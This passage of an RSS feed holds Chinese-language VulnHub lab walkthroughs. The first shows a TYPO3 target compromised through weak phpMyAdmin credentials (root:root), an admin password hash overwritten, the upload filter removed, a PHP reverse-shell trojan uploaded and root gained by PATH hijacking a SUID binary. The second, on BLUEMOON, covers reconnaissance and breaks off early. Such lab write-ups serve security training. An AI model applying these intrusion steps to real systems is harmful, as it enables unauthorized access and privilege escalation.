+&lt;p&gt;依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息&lt;/p&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集，发现网站是一个 typo3 的地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-664.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开 http://192.168.0.153:8000 搜集信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-665.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开 http://192.168.0.153:8080 搜集信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-666.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开 http://192.168.0.153:8081 搜集信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-667.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8000&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-668.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依次打开收集到的目录看能否找到更多信息&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=&#34;&gt;http://192.168.31.176:8080/phpinfo.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-669.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8081&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-670.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;phpmyadmin-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-渗透测试&#34;&gt;#&lt;/a&gt; phpmyadmin 渗透测试&lt;/h3&gt;
+&lt;p&gt;发现敏感地址，phpmyadmin 存在弱口令&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=&#34;&gt;http://192.168.31.176:8081/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-671.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用弱口令 root：root 登陆成功拿到后台的权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-672.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;对 phpmyadmin 进行写 shell 拿网站权限&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-673.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;是否可以写入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为/var/lib/mysql-files，只允许导出到此目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-674.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否开启日志记录以及日志保存目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHOW VARIABLES LIKE &amp;#x27;%general_log%&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为OFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-675.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启写入日志的开关：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log = &amp;quot;ON&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-676.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-677.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改默认的日志写入地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log_file=“1.php”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-678.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; phpmyadmin 拿 shell 失败，得采用其他的方式&lt;/p&gt;
+&lt;h3 id=&#34;覆盖admin密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#覆盖admin密码&#34;&gt;#&lt;/a&gt; 覆盖 admin 密码&lt;/h3&gt;
+&lt;p&gt;查看 sql 之后看到密码采用 argon 算法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-679.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码&lt;br&gt;
+在网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==&#34;&gt;https://pypi.org/project/argon2-cffi/&lt;/span&gt; 上看到了 argron2 的生成教程&lt;br&gt;
+通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-680.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 pip 来安装 argon： &lt;code&gt;python3 -m pip install argon2-cffi&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-681.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打开python的命令行，依次输入以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from argon2 import PasswordHasher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ph = PasswordHasher()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash = ph.hash(&amp;quot;typo&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hash)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-682.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打印出来的即为密码为 typo 的 argon 算法之后的加密字符:&lt;br&gt;
+ &lt;code&gt;$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-683.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 现在就有了一个用户名密码分别为 admin:typo 的组合&lt;/p&gt;
+&lt;p&gt;但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-684.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）&lt;br&gt;
+用 admin：typo 进入此后台&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-685.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 拿到了后台地址&lt;/p&gt;
+&lt;h3 id=&#34;修改过滤规则上传木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改过滤规则上传木马&#34;&gt;#&lt;/a&gt; 修改过滤规则上传木马&lt;/h3&gt;
+&lt;p&gt;进入后台之后看到是一个普通的后台管理地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-686.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-687.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-688.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-689.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：&lt;br&gt;
+ &lt;code&gt;\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-690.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将原有的过滤规则全部清除&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-691.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;确定之后，接下来文件上传将不会受到任何限制&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-692.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再次尝试上传 shell.php 就上传成功了&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-693.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-694.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-695.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用一些命令将终端变为一个标准的shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-696.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/passwd | grep www&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;判断出来没有其他的用户，需要直接拿到 root 的 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-697.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看定时任务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-698.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现没有任何任务被加载&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否有设置错误的s权限的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-699.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 找到一个 apache2-restart&lt;/p&gt;
+&lt;h3 id=&#34;文件权限设置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件权限设置错误提权&#34;&gt;#&lt;/a&gt; 文件权限设置错误提权&lt;/h3&gt;
+&lt;p&gt;很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-700.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过修改环境变量提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp/:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/local/apache2-restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-701.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/</guid>
+            <title>VULNHUB 28 BLUEMOON</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv&#34;&gt;https://www.vulnhub.com/entry/bluemoon-2021,679/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=&#34;&gt;https://www.jianshu.com/p/5d5b7f2d20e4&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-702.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-703.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
+&lt;h3 id=&#34;ftp-弱口令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令&#34;&gt;#&lt;/a&gt; FTP 弱口令&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-704.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看源代码，发现一个图片的地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-705.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看样子是一个蓝色的月球，但是这个图片没什么作用&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-706.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;先尝试从 ftp 进行突破 &lt;code&gt;ftp 192.168.0.153&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-707.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;尝试弱口令登陆失败，接下来对 80 网站进行目录扫描&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python3 dirmap.py -i http://192.168.0.153 -lcf&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-708.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-709.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 dirbuster 中的 directory 字典扫出来了一个目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=&#34;&gt;http://192.168.0.153/hidden_text&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-710.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看源代码，看能否有更多的发现，找到了一个隐藏的图片&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-711.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问得到了一个 url 地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n&#34;&gt;http://192.168.0.153/.QR_C0d3.png&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-712.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
